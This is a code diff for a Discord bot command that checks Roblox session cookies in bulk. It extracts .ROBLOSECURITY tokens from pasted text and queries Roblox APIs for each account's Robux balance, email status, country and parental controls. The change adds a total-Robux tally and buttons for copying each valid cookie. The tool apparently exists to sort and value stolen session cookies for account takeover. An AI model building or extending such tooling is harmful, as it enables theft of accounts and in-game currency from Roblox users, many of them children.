@@ -9,8 +9,42 @@ import {
 } from 'discord.js';
 import axios from 'axios';
 import { validateCookie } from '../roblox';
-import { buildInitialButtons as storeAndBuildRow } from './reset';
 import type { Command } from './types';
+
+const store = new Map<string, string>();
+
+function buildCheckButtons(id: string): ActionRowBuilder<ButtonBuilder> {
+  return new ActionRowBuilder<ButtonBuilder>().addComponents(
+    new ButtonBuilder()
+      .setCustomId(`check_copypc_${id}`)
+      .setLabel('💻 Copy PC')
+      .setStyle(ButtonStyle.Secondary),
+    new ButtonBuilder()
+      .setCustomId(`check_copymob_${id}`)
+      .setLabel('📱 Copy Mobile')
+      .setStyle(ButtonStyle.Secondary),
+  );
+}
+
+interface RobuxResponse {
+  robux: number;
+}
+
+interface EmailResponse {
+  verifiedEmail: string | null;
+  pendingEmail: string | null;
+}
+
+interface ParentalResponse {
+  parents: unknown[];
+  canAddParent: boolean;
+}
+
+interface CountryResponse {
+  value: {
+    countryName: string;
+  };
+}
 
 const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
 const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;
@@ -35,12 +69,13 @@ function extractCookies(text: string): string[] {
 
 async function fetchRobux(cookie: string, userId: string): Promise<number> {
   try {
-    const resp = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
-      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
-      validateStatus: () => true,
-      timeout: 10000,
-    });
-    if (resp.status === 200 && resp.data) return resp.data.robux || 0;
+    const resp = await axios.get<RobuxResponse>(
+      `https://economy.roblox.com/v1/users/${userId}/currency`,
+      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` }, validateStatus: () => true, timeout: 10000 }
+    );
+    if (resp.status === 200 && resp.data) {
+      return resp.data.robux || 0;
+    }
   } catch {}
   return 0;
 }
@@ -51,7 +86,7 @@ async function fetchCountry(cookie: string): Promise<string> {
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
-      const data = await resp.json();
+      const data = (await resp.json()) as CountryResponse;
       return data.value?.countryName || 'Unknown';
     }
   } catch {}
@@ -64,7 +99,7 @@ async function fetchEmailInfo(cookie: string): Promise<{ verified: string | null
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
-      const data = await resp.json();
+      const data = (await resp.json()) as EmailResponse;
       return { verified: data.verifiedEmail || null, pending: data.pendingEmail || null };
     }
   } catch {}
@@ -77,7 +112,7 @@ async function fetchParentalControls(cookie: string): Promise<{ hasParent: boole
       headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
     });
     if (resp.status === 200) {
-      const data = await resp.json();
+      const data = (await resp.json()) as ParentalResponse;
       return { hasParent: (data.parents && data.parents.length > 0) || false };
     }
   } catch {}
@@ -148,8 +183,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     await interaction.editReply({ embeds: [progressEmbed] });
 
     let validCount = 0;
-    let totalIncoming = 0;
-    let totalOutgoing = 0;
+    let totalRobux = 0;
 
     for (let i = 0; i < cookies.length; i++) {
       const cookie = cookies[i];
@@ -165,12 +199,17 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         fetchParentalControls(cookie),
       ]);
 
+      totalRobux += robux;
+
       let emailStatus = 'No email';
       if (email.verified) emailStatus = '✅ Verified';
       else if (email.pending) emailStatus = '⏳ Pending';
 
       const id = Math.random().toString(36).slice(2, 10);
-      const row = storeAndBuildRow(id);
+      store.set(id, cookie);
+      setTimeout(() => store.delete(id), 300000);
+
+      const row = buildCheckButtons(id);
 
       const embed = new EmbedBuilder()
         .setTitle(`𖣐 Valid Cookie #${validCount}`)
@@ -182,7 +221,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           `⭑ **Display:** ${displayName || username}\n` +
           `⭑ **User ID:** ${userId}\n` +
           `⭑ **Country:** ${country}\n` +
-          `⭑ **Robux:** ${robux.toLocaleString()} ₽\n` +
+          `💰 **Robux:** ${robux.toLocaleString()} ₽\n` +
           `────\n` +
           `✧ **Account Details**\n` +
           `────\n` +
@@ -202,7 +241,7 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       .setDescription(
         validCount === 0
           ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
-          : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}`
+          : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()} ₽`
       )
       .setImage('https://files.catbox.moe/955g15.gif')
       .setFooter(footerData);
